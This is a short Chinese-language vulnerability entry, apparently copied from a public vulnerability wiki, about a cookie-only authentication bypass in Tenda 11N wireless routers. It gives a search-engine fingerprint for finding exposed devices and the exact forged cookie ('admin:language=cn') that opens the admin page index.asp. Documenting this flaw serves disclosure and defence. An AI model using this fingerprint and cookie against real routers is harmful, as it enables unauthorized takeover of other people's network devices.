---
title: "Tenda 11N无线路由器 Cookie 越权访问漏洞"
date: 2026-10-18 09:15:23
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Tenda"
tags:
  - "Tenda"
  - "越权"
  - "漏洞复现"
---
## 漏洞描述

Tenda 11N无线路由器由于只验证Cookie，导致任意用户伪造Cookie即可进入后台

## 漏洞影响

```
Tenda 11N无线路由器
```

## 网络测绘

```
app="TENDA-11N无线路由器"
```

## 漏洞复现

登录页面

![image-20220519180949727](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191809768.png)

添加Cookie, 访问 index.asp 进入后台

```
admin:language=cn
```

![image-20220519181248549](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191812628.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Tenda-11N%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8-Cookie-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
